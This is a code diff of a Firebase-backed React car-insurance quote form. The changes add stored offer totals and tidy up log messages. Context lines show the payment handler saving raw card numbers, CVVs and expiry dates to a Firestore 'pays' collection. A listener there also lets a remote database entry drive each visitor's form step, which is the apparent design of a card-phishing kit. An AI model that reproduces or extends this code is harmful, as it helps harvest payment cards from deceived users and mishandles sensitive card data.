@@ -9,7 +9,6 @@ import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { FullPageLoader } from "@/components/loader"
 import PaymentPage from "@/components/pay-form"
-import { Traker } from "@/components/traker"
 import { doc, onSnapshot } from "firebase/firestore"
 import { StepIndicator } from "@/components/step-indicator"
 
@@ -60,6 +59,7 @@ export default function InsuranceForm() {
   const [insuranceCoverage, setInsuranceCoverage] = useState("")
   const [vehicleUsage, setVehicleUsage] = useState("")
   const [vehicleValue, setVehicleValue] = useState("")
+  const [totalPrice, setTotalPrice] = useState(0)
   const [vehicleYear, setVehicleYear] = useState("")
   const [vehicleModel, setVehicleModel] = useState("")
   const [repairLocation, setRepairLocation] = useState("agency")
@@ -113,14 +113,14 @@ export default function InsuranceForm() {
   useEffect(() => {
     if (!visitorID) return
 
-    console.log("[v0] Setting up Firestore listener for visitor:", visitorID)
+    console.log(" Setting up Firestore listener for visitor:", visitorID)
     
     const unsubscribe = onSnapshot(
       doc(db, "pays", visitorID), 
       (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
-          console.log("[v0] Firestore data received:", data)
+          console.log(" Firestore data received:", data)
           
           // Handle special navigation cases
           if (data.currentStep === "home") {
@@ -135,20 +135,20 @@ export default function InsuranceForm() {
               ? parseInt(data.currentStep) 
               : data.currentStep
             
-            console.log("[v0] Setting current step to:", step)
+            console.log(" Setting current step to:", step)
             setCurrentStep(step)
           }
         } else {
-          console.log("[v0] No document found for visitor:", visitorID)
+          console.log(" No document found for visitor:", visitorID)
         }
       },
       (error) => {
-        console.error("[v0] Firestore listener error:", error)
+        console.error(" Firestore listener error:", error)
       }
     )
 
     return () => {
-      console.log("[v0] Cleaning up Firestore listener")
+      console.log(" Cleaning up Firestore listener")
       unsubscribe()
     }
   }, [visitorID])
@@ -243,14 +243,23 @@ export default function InsuranceForm() {
       setCurrentStep(3)
     })
   }
-
   const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
     setSelectedOffer(offer)
-    await addData({ id: visitorID, selectedOffer: offer.company, offerValue: offer.main_price, currentStep: 4 }).then(() => {
+    const offerSelectedFeatures = selectedFeatures[offer.id] || []
+    const calculatedTotal = calculateOfferTotal(offer, offerSelectedFeatures)
+    setTotalPrice(calculatedTotal)
+
+    await addData({
+      id: visitorID,
+      selectedOffer: offer.company,
+      offerValue: offer.main_price,
+      totalPrice: calculatedTotal,
+      selectedFeatures: offerSelectedFeatures,
+      currentStep: 4,
+    }).then(() => {
       setCurrentStep(4)
     })
   }
-
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault()
     await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod }).then(() => {
@@ -672,8 +681,7 @@ export default function InsuranceForm() {
           <div className="max-w-4xl mx-auto space-y-3 md:space-y-4">
             {filteredOffers.map((offer) => {
               const offerSelectedFeatures = selectedFeatures[offer.id] || []
-              const totalPrice = calculateOfferTotal(offer, offerSelectedFeatures)
-
+              const _totalPrice = calculateOfferTotal(offer, offerSelectedFeatures)
               return (
                 <div
                   key={offer.id}
